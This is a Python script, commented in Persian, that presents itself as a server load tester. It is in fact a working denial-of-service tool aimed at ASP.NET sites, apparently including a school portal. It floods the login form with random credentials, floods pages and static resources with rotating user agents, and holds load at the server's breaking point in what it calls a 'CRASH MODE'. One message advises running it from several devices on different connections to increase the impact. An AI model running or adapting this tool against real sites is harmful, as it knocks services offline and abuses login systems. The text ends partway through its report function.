#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════════════╗
║     🔥 تست ترکیبی بار سرور (Combined Server Load Tester)               ║
║                                                                           ║
║  ✅ همزمان لاگین فلاد + صفحه فلاد + API بومب                             ║
║  ✅ مدیریت هوشمند کانکشن (خودت رو کریش نمیکنه)                          ║
║  ✅ کشف خودکار لینک‌های سایت                                             ║
║  ✅ هدف‌گیری صفحات سنگین                                                 ║
║                                                                           ║
║  ⚠ فقط برای تست سایت خودتان!                                             ║
╚═══════════════════════════════════════════════════════════════════════════╝

نحوه استفاده:
  python combined_tester.py                                    # اجرای مستقیم
  python combined_tester.py --max-workers 2000                 # ورکر بیشتر
"""

import asyncio
import argparse
import time
import statistics
import sys
import signal
import json
import random
import string
import re
from dataclasses import dataclass, field
from typing import List, Optional, Dict, Set, Tuple
from collections import deque

try:
    import aiohttp
except ImportError:
    print("خطا: pip install aiohttp")
    sys.exit(1)


# ═══════════════════════════════════════════════════════════════════════════════
# رنگ‌ها
# ═══════════════════════════════════════════════════════════════════════════════

class C:
    R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'; B = '\033[94m'
    M = '\033[95m'; CY = '\033[96m'; W = '\033[97m'; BD = '\033[1m'
    DM = '\033[2m'; RS = '\033[0m'


# ═══════════════════════════════════════════════════════════════════════════════
# User-Agent
# ═══════════════════════════════════════════════════════════════════════════════

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
]

def random_ua() -> str:
    return random.choice(USER_AGENTS)


# ═══════════════════════════════════════════════════════════════════════════════
# تولید داده تصادفی
# ═══════════════════════════════════════════════════════════════════════════════

def rand_user(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def rand_pass(length=10):
    chars = string.ascii_letters + string.digits + "!@#$%"
    return ''.join(random.choices(chars, k=length))


# ═══════════════════════════════════════════════════════════════════════════════
# استخراج فیلدهای ASP.NET
# ═══════════════════════════════════════════════════════════════════════════════

def extract_form_fields(html: str) -> Dict[str, str]:
    fields = {}
    hidden_inputs = re.findall(r'<input[^>]*type="hidden"[^>]*>', html, re.IGNORECASE)
    for inp in hidden_inputs:
        name_match = re.search(r'name="([^"]*)"', inp)
        value_match = re.search(r'value="([^"]*)"', inp)
        if name_match:
            fields[name_match.group(1)] = value_match.group(1) if value_match else ""
    asp_inputs = re.findall(r'<input[^>]*name="(__[^"]*)"[^>]*value="([^"]*)"[^>]*>', html)
    for name, value in asp_inputs:
        if name not in fields:
            fields[name] = value
    return fields


def detect_login_fields(html: str) -> Tuple[str, str, str]:
    username_field = "username"
    password_field = "password"
    login_button = ""
    patterns_user = [
        r'name="(ctl00[^"]*[Uu]ser[^"]*)"', r'name="(txtUserName)"',
        r'name="(txtUsername)"', r'name="(txtUser)"',
        r'name="(UserName)"', r'name="(username)"',
        r'name="(email)"', r'name="(txtEmail)"',
    ]
    patterns_pass = [
        r'name="(ctl00[^"]*[Pp]ass[^"]*)"', r'name="(txtPassword)"',
        r'name="(txtPass)"', r'name="(Password)"',
        r'name="(password)"', r'name="(txtPwd)"',
    ]
    patterns_btn = [
        r'name="(ctl00[^"]*[Bb]tn[^"]*[Ll]ogin[^"]*)"', r'name="(ctl00[^"]*[Bb]tn[^"]*)"',
        r'name="(btnLogin)"', r'name="(Button1)"',
        r'name="(btnSubmit)"', r'name="(Submit)"',
        r'type="submit"[^>]*name="([^"]*)"',
    ]
    for p in patterns_user:
        m = re.search(p, html)
        if m:
            username_field = m.group(1); break
    for p in patterns_pass:
        m = re.search(p, html)
        if m:
            password_field = m.group(1); break
    for p in patterns_btn:
        m = re.search(p, html)
        if m:
            login_button = m.group(1); break
    return username_field, password_field, login_button


def extract_links(html: str, base_url: str) -> Set[str]:
    """کشف خودکار لینک‌های داخلی سایت"""
    links = set()
    # href links
    for m in re.finditer(r'href=["\']([^"\']+)["\']', html, re.IGNORECASE):
        link = m.group(1)
        if link.startswith('/'):
            link = base_url.rstrip('/') + link
        if base_url.split('//')[1].split('/')[0] in link:
            links.add(link)
    # src links (تصاویر، اسکریپت، استایل)
    for m in re.finditer(r'src=["\']([^"\']+)["\']', html, re.IGNORECASE):
        link = m.group(1)
        if link.startswith('/'):
            link = base_url.rstrip('/') + link
        if base_url.split('//')[1].split('/')[0] in link:
            links.add(link)
    return links


# ═══════════════════════════════════════════════════════════════════════════════
# Data Classes
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class HitResult:
    ok: bool
    code: Optional[int]
    rt: float
    mode: str = ""  # login / page / resource
    err: Optional[str] = None
    hint: str = ""
    ts: float = field(default_factory=time.time)

@dataclass
class Stats:
    total: int = 0
    ok: int = 0
    fail: int = 0
    rate_limited: int = 0
    captcha: int = 0
    locked: int = 0
    login_ok: int = 0
    login_fail: int = 0
    page_hits: int = 0
    resource_hits: int = 0
    rts: List[float] = field(default_factory=list)
    codes: Dict[int, int] = field(default_factory=dict)
    hints: Dict[str, int] = field(default_factory=dict)
    errs: List[str] = field(default_factory=list)
    t0: float = 0
    t1: float = 0
    users: int = 0
    _recent: deque = field(default_factory=lambda: deque(maxlen=3000))
    first_rl_at: int = 0
    first_cap_at: int = 0
    first_lock_at: int = 0

    @property
    def dur(self):
        return (self.t1 if self.t1 > self.t0 else time.time()) - self.t0 if self.t0 else 0

    @property
    def rps(self):
        return self.total / self.dur if self.dur > 0 else 0

    @property
    def rrps(self):
        now = time.time()
        r = [x for x in self._recent if now - x.ts < 5]
        return len(r) / 5 if r else 0

    @property
    def art(self):
        return statistics.mean(self.rts) if self.rts else 0

    @property
    def rart(self):
        now = time.time()
        r = [x.rt for x in self._recent if now - x.ts < 5]
        return statistics.mean(r) if r else 0

    @property
    def sr(self):
        return (self.ok / self.total * 100) if self.total > 0 else 0


# ═══════════════════════════════════════════════════════════════════════════════
# Engine
# ═══════════════════════════════════════════════════════════════════════════════

class CombinedTester:
    def __init__(self, login_url: str, timeout: int = 20, safe_max: int = 3000):
        self.login_url = login_url
        self.base_url = login_url.split('?')[0].rsplit('/', 1)[0] if '/' in login_url.split('?')[0] else login_url
        self.site_root = login_url.split('//')[0] + '//' + login_url.split('//')[1].split('/')[0]
        self.timeout = aiohttp.ClientTimeout(total=timeout)
        self.stats = Stats()
        self._stop = asyncio.Event()
        self._snaps: List[dict] = []
        self.safe_max = safe_max  # حداکثر ایمن ورکر (جلوگیری از کریش سیستم)
        
        # فیلدهای تشخیص‌شده
        self.username_field = "username"
        self.password_field = "password"
        self.login_button = ""
        self.detected = False
        
        # صفحات کشف‌شده
        self.discovered_pages: List[str] = []
        self.discovered_resources: List[str] = []
        
        # صفحات هدف اضافی (حدس‌های هوشمند)
        self.guessed_pages: List[str] = []
        self.peak_workers = 0  # بالاترین ورکر پایدار
        self.limit_hit = False # نشانگر برخورد به سقف سرور

    def stop(self):
        self._stop.set()

    def _base_headers(self) -> Dict[str, str]:
        return {
            "User-Agent": random_ua(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7",
            "Accept-Encoding": "gzip, deflate, br",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
        }

    async def _fetch_page(self, session: aiohttp.ClientSession, url: str = None) -> Optional[str]:
        """دانلود صفحه برای استخراج فیلدها و لینک‌ها"""
        headers = self._base_headers()
        try:
            async with session.get(url or self.login_url, headers=headers, ssl=False, allow_redirects=True) as resp:
                return await resp.text()
        except Exception as e:
            print(f"  {C.R}خطا در دریافت صفحه: {e}{C.RS}")
            return None

    async def _detect_and_discover(self, session: aiohttp.ClientSession):
        """تشخیص فیلدهای فرم و کشف لینک‌ها"""
        print(f"\n  {C.CY}🔍 بررسی و کشف سایت...{C.RS}")
        
        # مرحله ۱: صفحه لاگین
        html = await self._fetch_page(session)
        if not html:
            print(f"  {C.R}❌ صفحه دریافت نشد — VPN خاموشه؟{C.RS}")
            return False
        
        # تشخیص فیلدها
        self.username_field, self.password_field, self.login_button = detect_login_fields(html)
        asp_fields = extract_form_fields(html)
        
        print(f"  {C.G}✅ صفحه لاگین دریافت شد ({len(html):,} بایت){C.RS}")
        print(f"  📝 فیلد کاربر:   {C.BD}{self.username_field}{C.RS}")
        print(f"  🔑 فیلد رمز:     {C.BD}{self.password_field}{C.RS}")
        if self.login_button:
            print(f"  🔘 دکمه لاگین:   {C.BD}{self.login_button}{C.RS}")
        
        if asp_fields:
            print(f"  📋 فیلدهای مخفی ASP.NET:")
            for k, v in asp_fields.items():
                val_preview = v[:40] + "..." if len(v) > 40 else v
                print(f"     {C.DM}{k} = {val_preview}{C.RS}")
        
        # مرحله ۲: کشف لینک‌ها
        links = extract_links(html, self.site_root)
        
        # دسته‌بندی لینک‌ها
        for link in links:
            ext = link.rsplit('.', 1)[-1].lower() if '.' in link.split('?')[0].rsplit('/', 1)[-1] else ''
            if ext in ('jpg', 'jpeg', 'png', 'gif', 'svg', 'ico', 'webp', 'bmp',
                        'css', 'js', 'woff', 'woff2', 'ttf', 'eot',
                        'pdf', 'doc', 'docx', 'xls', 'xlsx', 'zip', 'rar'):
                self.discovered_resources.append(link)
            elif ext in ('aspx', 'html', 'htm', 'php', '') or '?' in link:
                self.discovered_pages.append(link)
        
        # مرحله ۳: حدس صفحات رایج ASP.NET
        common_pages = [
            "/Default.aspx",
            "/FirstPages/Student.aspx",
            "/FirstPages/Teacher.aspx",
            "/FirstPages/Admin.aspx",
            "/FirstPages/Default.aspx",
            "/FirstPages/Home.aspx",
            "/Admin/Default.aspx",
            "/Admin/Login.aspx",
            "/api/",
            "/handler.ashx",
            "/WebService.asmx",
        ]
        for page in common_pages:
            full_url = self.site_root + page
            if full_url not in self.discovered_pages:
                self.guessed_pages.append(full_url)
        
        # مرحله ۴: حدس مسیرهای تصویر/فایل سنگین
        common_resources = [
            "/Content/Images/logo.png",
            "/Content/Images/bg.jpg",
            "/Images/logo.png",
            "/Scripts/jquery.js",
            "/Content/Site.css",
            "/favicon.ico",
        ]
        for res in common_resources:
            full_url = self.site_root + res
            if full_url not in self.discovered_resources:
                self.discovered_resources.append(full_url)
        
        # نمایش نتایج کشف
        total_pages = len(self.discovered_pages) + len(self.guessed_pages)
        total_res = len(self.discovered_resources)
        print(f"\n  {C.G}🔎 کشف شده:{C.RS}")
        print(f"     📄 صفحات:       {C.BD}{len(self.discovered_pages)}{C.RS} لینک + {C.BD}{len(self.guessed_pages)}{C.RS} حدسی")
        print(f"     🖼️ منابع:       {C.BD}{total_res}{C.RS} فایل")
        
        # تست سریع صفحات حدسی
        print(f"\n  {C.CY}🧪 تست سریع صفحات حدسی...{C.RS}")
        valid_pages = []
        for page_url in self.guessed_pages[:10]:
            try:
                headers = self._base_headers()
                async with session.get(page_url, headers=headers, ssl=False,
                                       timeout=aiohttp.ClientTimeout(total=5),
                                       allow_redirects=True) as resp:
                    if resp.status < 400:
                        valid_pages.append(page_url)
                        size = len(await resp.text())
                        print(f"     {C.G}✅{C.RS} {page_url} ({size:,} بایت)")
                    else:
                        print(f"     {C.DM}❌{C.RS} {page_url} ({resp.status})")
            except:
                print(f"     {C.DM}⏱️{C.RS} {page_url} (timeout)")
        
        # جایگزین کردن صفحات حدسی با تست‌شده‌ها
        self.guessed_pages = valid_pages
        
        self.detected = True
        return True

    async def _send_login(self, session: aiohttp.ClientSession) -> HitResult:
        """حمله لاگین فلاد: GET → استخراج فیلدها → POST"""
        t = time.time()
        try:
            # GET صفحه
            headers_get = self._base_headers()
            async with session.get(self.login_url, headers=headers_get, ssl=False,
                                   allow_redirects=True) as resp_get:
                html = await resp_get.text()
            
            # استخراج فیلدهای مخفی
            hidden_fields = extract_form_fields(html)
            
            # POST لاگین
            username = rand_user(random.randint(5, 12))
            password = rand_pass(random.randint(8, 14))
            
            form_data = {
                **hidden_fields,
                self.username_field: username,
                self.password_field: password,
            }
            if self.login_button:
                form_data[self.login_button] = "ورود"
            
            headers_post = {
                **self._base_headers(),
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": self.site_root,
                "Referer": self.login_url,
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-User": "?1",
                "Upgrade-Insecure-Requests": "1",
            }
            
            async with session.post(self.login_url, headers=headers_post, data=form_data,
                                    ssl=False, allow_redirects=False) as resp_post:
                body = await resp_post.text()
                elapsed = time.time() - t
                
                hint = self._analyze_response(resp_post.status, body)
                return HitResult(
                    ok=resp_post.status < 500,
                    code=resp_post.status,
                    rt=elapsed,
                    mode="login",
                    hint=hint,
                )
                
        except asyncio.TimeoutError:
            return HitResult(ok=False, code=None, rt=time.time()-t, mode="login", err="Timeout")
        except aiohttp.ClientError as e:
            msg = str(e)
            if "Connection" in msg: msg = "ConnErr"
            elif "Cannot connect" in msg: msg = "NoConnect"
            elif "Buffer" in msg or "buffer" in msg: msg = "BufFull"
            return HitResult(ok=False, code=None, rt=time.time()-t, mode="login", err=msg)
        except Exception as e:
            return HitResult(ok=False, code=None, rt=time.time()-t, mode="login", err=type(e).__name__)

    async def _hit_page(self, session: aiohttp.ClientSession, url: str) -> HitResult:
        """حمله صفحه فلاد: درخواست صفحات سنگین"""
        t = time.time()
        try:
            headers = self._base_headers()
            async with session.get(url, headers=headers, ssl=False,
                                   allow_redirects=True) as resp:
                body = await resp.text()
                elapsed = time.time() - t
                return HitResult(
                    ok=resp.status < 500,
                    code=resp.status,
                    rt=elapsed,
                    mode="page",
                    hint=f"Page {resp.status} ({len(body):,}B)",
                )
        except asyncio.TimeoutError:
            return HitResult(ok=False, code=None, rt=time.time()-t, mode="page", err="Timeout")
        except Exception as e:
            msg = type(e).__name__
            if "Buffer" in str(e) or "buffer" in str(e): msg = "BufFull"
            return HitResult(ok=False, code=None, rt=time.time()-t, mode="page", err=msg)

    async def _hit_resource(self, session: aiohttp.ClientSession, url: str) -> HitResult:
        """حمله منابع: درخواست فایل‌های سنگین (تصاویر، CSS, JS)"""
        t = time.time()
        try:
            headers = {
                "User-Agent": random_ua(),
                "Accept": "image/webp,image/apng,image/*,*/*;q=0.8",
                "Accept-Encoding": "gzip, deflate, br",
                "Cache-Control": "no-cache",
            }
            async with session.get(url, headers=headers, ssl=False,
                                   allow_redirects=True) as resp:
                data = await resp.read()
                elapsed = time.time() - t
                return HitResult(
                    ok=resp.status < 500,
                    code=resp.status,
                    rt=elapsed,
                    mode="resource",
                    hint=f"Res {resp.status} ({len(data):,}B)",
                )
        except asyncio.TimeoutError:
            return HitResult(ok=False, code=None, rt=time.time()-t, mode="resource", err="Timeout")
        except Exception as e:
            msg = type(e).__name__
            if "Buffer" in str(e) or "buffer" in str(e): msg = "BufFull"
            return HitResult(ok=False, code=None, rt=time.time()-t, mode="resource", err=msg)

    def _analyze_response(self, status: int, body: str) -> str:
        """تحلیل پاسخ سرور برای تشخیص امنیت"""
        body_lower = body.lower()
        
        if status == 429:
            return "429 Rate Limited"
        elif status == 503:
            return "503 Unavailable"
        elif any(x in body_lower for x in ["rate limit", "too many", "slow down"]):
            return "Rate limit in body"
        elif any(x in body_lower for x in ["captcha", "recaptcha", "hcaptcha"]):
            return "CAPTCHA required"
        elif any(x in body_lower for x in ["locked", "account disabled", "too many attempts"]):
            return "Account locked"
        elif any(x in body_lower for x in ["welcome", "dashboard", "logout", "خوش آمدید"]):
            return "Login success!"
        elif status in (301, 302, 303, 307):
            return f"Redirect"
        elif any(x in body_lower for x in ["invalid", "wrong", "incorrect", "نامعتبر", "اشتباه"]):
            return "Invalid credentials"
        else:
            return f"Status {status}"

    def _record(self, r: HitResult):
        self.stats.total += 1
        self.stats.rts.append(r.rt)
        self.stats._recent.append(r)
        
        if r.ok:
            self.stats.ok += 1
        else:
            self.stats.fail += 1
            if r.err:
                self.stats.errs.append(r.err)
        
        if r.code:
            self.stats.codes[r.code] = self.stats.codes.get(r.code, 0) + 1
        
        if r.hint:
            self.stats.hints[r.hint] = self.stats.hints.get(r.hint, 0) + 1
        
        # شمارش بر اساس حالت
        if r.mode == "login":
            h = r.hint.lower()
            if "rate limit" in h or "429" in h or "503" in h:
                self.stats.rate_limited += 1
                if not self.stats.first_rl_at:
                    self.stats.first_rl_at = self.stats.total
            elif "captcha" in h:
                self.stats.captcha += 1
                if not self.stats.first_cap_at:
                    self.stats.first_cap_at = self.stats.total
            elif "locked" in h or "too many" in h:
                self.stats.locked += 1
                if not self.stats.first_lock_at:
                    self.stats.first_lock_at = self.stats.total
            elif "success" in h or "redirect" in h:
                self.stats.login_ok += 1
            else:
                self.stats.login_fail += 1
        elif r.mode == "page":
            self.stats.page_hits += 1
        elif r.mode == "resource":
            self.stats.resource_hits += 1

    def _get_target_urls(self) -> Tuple[List[str], List[str]]:
        """دریافت لیست صفحات و منابع هدف"""
        pages = list(self.discovered_pages) + list(self.guessed_pages)
        if not pages:
            pages = [self.site_root + "/Default.aspx", self.login_url]
        
        resources = list(self.discovered_resources)
        if not resources:
            resources = [self.site_root + "/favicon.ico"]
        
        return pages, resources

    async def _worker_login(self, session: aiohttp.ClientSession, delay: float = 0):
        """ورکر لاگین فلاد"""
        if delay > 0:
            await asyncio.sleep(delay)
        while not self._stop.is_set():
            result = await self._send_login(session)
            self._record(result)
            if "BufFull" in (result.err or ""):
                # بافر پر شده — صبر کن
                await asyncio.sleep(2)
            else:
                await asyncio.sleep(0.01)

    async def _worker_page(self, session: aiohttp.ClientSession, pages: List[str], delay: float = 0):
        """ورکر صفحه فلاد"""
        if delay > 0:
            await asyncio.sleep(delay)
        while not self._stop.is_set():
            url = random.choice(pages)
            result = await self._hit_page(session, url)
            self._record(result)
            if "BufFull" in (result.err or ""):
                await asyncio.sleep(2)
            else:
                await asyncio.sleep(0.01)

    async def _worker_resource(self, session: aiohttp.ClientSession, resources: List[str], delay: float = 0):
        """ورکر منابع فلاد"""
        if delay > 0:
            await asyncio.sleep(delay)
        while not self._stop.is_set():
            # هر بار چند منبع رو همزمان بخون (سنگین‌تر)
            urls = random.sample(resources, min(3, len(resources)))
            for url in urls:
                if self._stop.is_set():
                    break
                result = await self._hit_resource(session, url)
                self._record(result)
                if "BufFull" in (result.err or ""):
                    await asyncio.sleep(2)
            await asyncio.sleep(0.01)

    async def run(self, max_workers: int = 2000, step: int = 100, step_dur: int = 5):
        self.stats = Stats()
        self.stats.t0 = time.time()

        # محدود کردن ورکرها برای جلوگیری از کریش سیستم
        actual_max = min(max_workers, self.safe_max)
        if actual_max < max_workers:
            print(f"\n  {C.Y}⚠ حداکثر ورکر به {actual_max:,} محدود شد (جلوگیری از کریش سیستم){C.RS}")
            print(f"  {C.Y}  برای تأثیر بیشتر → از چند دستگاه با اینترنت مختلف اجرا کنید{C.RS}")

        connector = aiohttp.TCPConnector(
            limit=actual_max + 200,
            force_close=True,        # بستن کانکشن‌ها بعد از استفاده
            enable_cleanup_closed=True,
            ttl_dns_cache=30,
        )

        async with aiohttp.ClientSession(connector=connector, timeout=self.timeout) as session:
            # تشخیص و کشف
            ok = await self._detect_and_discover(session)
            if not ok:
                print(f"\n  {C.R}❌ نمی‌توان به سایت وصل شد. VPN خاموش کنید!{C.RS}")
                return

            pages, resources = self._get_target_urls()
            
            # تقسیم ورکرها: 50% لاگین، 30% صفحه، 20% منابع
            login_pct = 0.50
            page_pct = 0.30
            # resource_pct = 0.20

            print(f"\n{'═'*72}")
            print(f"  {C.BD}{C.R}🔥 تست ترکیبی بار سرور{C.RS}")
            print(f"{'═'*72}")
            print(f"  🎯 هدف:          {C.W}{self.login_url}{C.RS}")
            print(f"  👥 حداکثر ورکر:   {C.BD}{actual_max:,}{C.RS}")
            print(f"  🔐 لاگین فلاد:    {C.BD}{int(actual_max * login_pct):,}{C.RS} ورکر (50%)")
            print(f"  📄 صفحه فلاد:     {C.BD}{int(actual_max * page_pct):,}{C.RS} ورکر (30%)")
            print(f"  🖼️ منابع فلاد:    {C.BD}{int(actual_max * 0.20):,}{C.RS} ورکر (20%)")
            print(f"  📈 مراحل:         +{step} هر {step_dur}s")
            print(f"  📄 صفحات هدف:     {C.BD}{len(pages)}{C.RS}")
            print(f"  🖼️ منابع هدف:     {C.BD}{len(resources)}{C.RS}")
            print(f"  🛑 توقف:          {C.Y}Ctrl+C{C.RS}")
            print(f"{'═'*72}\n")

            all_tasks = []
            cur = 0
            self.peak_workers = 1000
            self.limit_hit = False
            pages, resources = self._get_target_urls()
            login_pct, page_pct = 0.50, 0.30

            while not self._stop.is_set():
                now = time.time()
                recent = [r for r in self.stats._recent if now - r.ts < step_dur]
                
                error_rate = 0
                buf_full_detected = False
                high_latency = False
                if recent:
                    fails = sum(1 for r in recent if not r.ok)
                    error_rate = fails / len(recent)
                    buf_full_detected = any("BufFull" in (r.err or "") for r in recent[-100:])
                    avg_rt = sum(r.rt for r in recent) / len(recent)
                    high_latency = avg_rt > 10.0 # کندی شدید سرور

                # الگوریتم قفل روی هدف (Target Lock-On)
                if (error_rate > 0.4 or buf_full_detected or high_latency) and cur > step:
                    # برخورد به سقف!
                    self.limit_hit = True
                    reduction = int(cur * 0.15)
                    reduction = max(reduction, step)
                    
                    reason = "بافر پر" if buf_full_detected else (f"خطا {error_rate:.0%}" if error_rate > 0.4 else "کندی شدید")
                    print(f"\n  {C.R}💥 سقف پیدا شد ({cur:,})! علت: {reason}{C.RS}")
                    
                    # کاهش به زیر سقف برای تجدید قوا
                    for _ in range(reduction):
                        if all_tasks:
                            t = all_tasks.pop()
                            t.cancel()
                    cur -= reduction
                    self.peak_workers = cur # ذخیره نقطه استقراض
                
                elif self.limit_hit and cur < self.peak_workers + step:
                    # اگر قبلاً سقف رو پیدا کردیم، همون دور و بر بمون (فشار ثابت)
                    to_add = min(int(step/4), self.peak_workers + step - cur)
                    if to_add > 0:
                        cur += to_add
                        print(f"\n  {C.G}🎯 نگه داشتن فشار روی نقطه شکست ({cur:,})...{C.RS}")
                        for _ in range(to_add):
                            self._spawn_worker(session, all_tasks, login_pct, page_pct, pages, resources)
                
                elif cur < actual_max:
                    # افزایش تا رسیدن به سقف
                    increment = step
                    if error_rate > 0.15: increment = int(step / 3) 
                    
                    new = min(increment, actual_max - cur)
                    if new > 0:
                        cur += new
                        print(f"\n  {C.M}📈 افزایش شدت → {C.BD}{cur:,}{C.RS}{C.M} ورکر{C.RS}")
                        for _ in range(new):
                            self._spawn_worker(session, all_tasks, login_pct, page_pct, pages, resources)

                self.stats.users = cur
                
                # نمایش وضعیت
                step_t0 = time.time()
                while time.time() - step_t0 < step_dur and not self._stop.is_set():
                    rps = self.stats.rrps
                    rl = self.stats.rate_limited
                    
                    health_c = C.G if error_rate < 0.15 else (C.Y if error_rate < 0.4 else C.R)
                    mode_text = f"{C.R}CRASH MODE{C.RS}" if self.limit_hit else f"{C.CY}SCALING{C.RS}"
                    
                    print(
                        f"\r  {mode_text} │ {C.CY}{self.stats.dur:.0f}s{C.RS} │ "
                        f"👥{cur:,} │ 📊{self.stats.total:,} │ "
                        f"{C.G}✓{self.stats.ok:,}{C.RS} │ {C.R}✗{self.stats.fail:,}{C.RS} │ "
                        f"⚡{rps:.01f}/s │ {health_c}H:{1-error_rate:.0%}{C.RS} │ "
                        f"⏳{step_dur - (time.time() - step_t0):.0f}s ",
                        end="", flush=True
                    )
                    await asyncio.sleep(1)
                self._snap()

            self._stop.set()
            if all_tasks:
                done, pending = await asyncio.wait(all_tasks, timeout=3)
                for t in pending: t.cancel()

    def _spawn_worker(self, session, all_tasks, login_pct, page_pct, pages, resources):
        r = random.random()
        delay = random.uniform(0, 2.0)
        if r < login_pct:
            t = asyncio.create_task(self._worker_login(session, delay=delay))
        elif r < login_pct + page_pct:
            t = asyncio.create_task(self._worker_page(session, pages, delay=delay))
        else:
            t = asyncio.create_task(self._worker_resource(session, resources, delay=delay))
        all_tasks.append(t)


        self.stats.t1 = time.time()

    def _snap(self):
        self._snaps.append({
            "t": self.stats.dur, "total": self.stats.total,
            "ok": self.stats.ok, "fail": self.stats.fail,
            "rps": self.stats.rrps, "art": self.stats.rart,
            "users": self.stats.users,
            "rl": self.stats.rate_limited,
            "cap": self.stats.captcha,
            "logins": self.stats.login_fail + self.stats.login_ok,
            "pages": self.stats.page_hits,
            "resources": self.stats.resource_hits,
        })


# ═══════════════════════════════════════════════════════════════════════════════
# گزارش
# ═══════════════════════════════════════════════════════════════════════════════

def report(st: Stats, url: str, snaps: list):
    print(f"\n\n{'═'*72}")
    print(f"  {C.BD}{C.R}🔥 گزارش تست ترکیبی بار سرور{C.RS}")
    print(f"{'═'*72}")
    print(f"  هدف: {url}")
    print(f"{'─'*72}")

    # ── خلاصه ──
    print(f"\n  ┌─{C.BD} خلاصه {C.RS}─────────────────────────────────────────────")
    print(f"  │ مدت:              {st.dur:.1f}s ({st.dur/60:.1f} min)")
    print(f"  │ کل درخواست:       {st.total:,}")
    print(f"  │ پاسخ سرور:        {C.G}{st.ok:,}{C.RS}")
    print(f"  │ خطای اتصال:       {C.R}{st.fail:,}{C.RS}")
    print(f"  │ میانگین RPS:      {st.rps:.1f}")
    if snaps:
        print(f"  │ حداکثر RPS:       {max(s['rps'] for s in snaps):.1f}")
    print(f"  └────────────────────────────────────────────────────")

    # ── تقسیم بر اساس نوع ──
    logins = st.login_fail + st.login_ok
    print(f"\n  ┌─{C.BD} تقسیم درخواست‌ها {C.RS}──────────────────────────────────────")
    print(f"  │ 🔐 لاگین فلاد:    {C.BD}{logins:,}{C.RS} ({logins/st.total*100:.1f}%)" if st.total else "")
    print(f"  │ 📄 صفحه فلاد:     {C.BD}{st.page_hits:,}{C.RS} ({st.page_hits/st.total*100:.1f}%)" if st.total else "")
    print(f"  │ 🖼️ منابع فلاد:    {C.BD}{st.resource_hits:,}{C.RS} ({st.resource_hits/st.total*100:.1f}%)" if st.total else "")
    print(f"  └────────────────────────────────────────────────────")

    # ── تحلیل امنیتی ──
    print(f"\n  ┌─{C.BD}{C.R} تحلیل امنیتی {C.RS}─────────────────────────────────────")
    if st.rate_limited > 0:
        print(f"  │ {C.G}✅ Rate Limiting: فعال{C.RS} (بعد از درخواست {st.first_rl_at})")
    else:
        print(f"  │ {C.R}❌ Rate Limiting: غیرفعال!{C.RS}")
    if st.captcha > 0:
        print(f"  │ {C.G}✅ CAPTCHA: فعال{C.RS} (بعد از درخواست {st.first_cap_at})")
    else:
        print(f"  │ {C.Y}⚠ CAPTCHA: مشاهده نشد{C.RS}")
    if st.locked > 0:
        print(f"  │ {C.G}✅ Account Lockout: فعال{C.RS} (بعد از درخواست {st.first_lock_at})")
    else:
        print(f"  │ {C.Y}⚠ Account Lockout: مشاهده نشد{C.RS}")
    print(f"  └────────────────────────────────────────────────────")

    # ── پاسخ‌های سرور ──
    if st.hints:
        print(f"\n  ┌─{C.BD} پاسخ‌های سرور (Top 15) {C.RS}───────────────────────────────")
        for hint, cnt in sorted(st.hints.items(), key=lambda x: -x[1])[:15]:
            pct = cnt / st.total * 100 if st.total else 0
            print(f"  │ {cnt:,}x ({pct:.1f}%) {hint}")
        print(f"  └────────────────────────────────────────────────────")

    # ── کدهای HTTP ──
    if st.codes:
        print(f"\n  ┌─{C.BD} کدهای HTTP {C.RS}─────────────────────────────────────────")
        for code, cnt in sorted(st.codes.items()):
            pct = cnt / st.total * 100 if st.total else 0
            if code == 200: ic = f"{C.G}✅"
            elif code == 429: ic = f"{C.R}🚫"
            elif code == 503: ic = f"{C.R}⛔"
            elif code == 302: ic = f"{C.B}↪️"
            elif code == 401: ic = f"{C.Y}🔐"
            else: ic = f"{C.B}📡"
            print(f"  │ {ic} {code}: {cnt:,} ({pct:.1f}%)")
        print(f"  └────────────────────────────────────────────────────")

    # ── خطاها ──
    if st.errs:
        print(f"\n  ┌─{C.BD} خطاها {C.RS}────────────────────────────────────────────────")
        ec = {}
        for e in st.errs:
            k = e[:50]
            ec[k] = ec.get(k, 0) + 1
        for err, cnt in sorted(ec.items(), key=lambda x: -x[1])[:10]:
            print(f"  │ {C.R}[{cnt:,}x]{C.RS} {err}")
        print(f"  └────────────────────────────────────────────────────")

    # ── روند ──
    if snaps:
        print(f"\n  ┌─{C.BD} روند {C.RS}───────────────────────────────────────────────────")
